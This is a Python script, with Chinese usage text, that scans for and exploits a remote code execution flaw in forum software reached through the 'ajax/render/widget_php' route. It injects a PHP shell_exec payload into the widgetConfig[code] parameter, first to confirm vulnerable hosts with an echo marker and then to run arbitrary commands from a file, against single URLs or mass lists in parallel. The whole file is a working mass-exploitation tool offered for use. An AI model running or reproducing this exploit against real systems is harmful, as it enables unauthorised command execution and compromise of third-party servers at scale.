#@author:九世
#@file:scan.py
#@time:2019/9/25

from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
import gevent
import requests
import os
import optparse
import time

class rce_scan:
    def __init__(self):
        self.times=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())
        self.params = {"routestring": "ajax/render/widget_php"}
        self.djcs=[]
        self.calc=0
        self.xcs=[]
        usage='python scan.py -u [url] -- 检测单个URL是否存在漏洞\n' \
              'python scan.py -f [file] -- 批量检测\n' \
              'python scan.py -x [url] -c [command.txt] -- 单个利用\n' \
              'python scan.py -b [file] -c [command.txt] -- 批量利用'
        pat=optparse.OptionParser(usage)
        pat.add_option('-u',dest='url',help='set rurl scan')
        pat.add_option('-f',dest='file',help='set file scan')
        pat.add_option('-x',dest='urls',help='set url exec')
        pat.add_option('-b',dest='files',help='set file exec')
        pat.add_option('-c',dest='cmd',help='exec command.txt')
        (option,args)=pat.parse_args()
        if option.url:
            self.scan(url=option.url,id=1)
        elif option.file:
            self.djc(option.file,id=1)
        elif option.urls and option.cmd:
            self.scan(url=option.urls,id=0,command=option.cmd)
        elif option.files and option.cmd:
            self.djc(files=option.files,id=0,command=option.cmd)
        else:
            pat.print_help()


    def scan(self,url,id,command=False):
        if id==1:
            command='echo haq5201314'
        else:
            command=command
        self.params["widgetConfig[code]"] = "echo shell_exec('" + '{}'.format(command) + "'); exit;"
        try:
            rqt=requests.post(url=url,data=self.params,timeout=10)
            if id==1:
                if 'haq5201314' in rqt.text:
                    print('[{}] [+] Found_RCE {}'.format(self.times,url))
                else:
                    print('[{}] [-] Not_Found_RCE:{}'.format(self.times,url))
            else:
                print('[{}] exec command.txt:'.format(self.times))
                print(rqt.text)
        except Exception as r:
            print('[{}] [!] ERROR:{}'.format(self.times,r))

    def xc(self,rw,id,command=False):
        for r in rw:
            if id==1:
                self.xcs.append(gevent.spawn(self.scan,r,1))
            else:
                self.xcs.append(gevent.spawn(self.scan,r,0,command))

        gevent.joinall(self.xcs)

    def djc(self,files,id,command=False):
        if os.path.exists(files):
            dk=open(files,'r',encoding='utf-8')
            for urls in dk.readlines():
                data="".join(urls.split('\n'))
                self.djcs.append(data)
                self.calc+=1
                if self.calc==100:
                    p=Process(target=self.xc,args=(self.djcs,id,command))
                    p.start()
                    self.djcs.clear()
                    self.calc=0

            if len(self.djcs)>0:
                p = Process(target=self.xc, args=(self.djcs,id,command))
                p.start()

        else:
            print('[-] Not Found file:{}'.format(files))


if __name__ == '__main__':
    obj=rce_scan()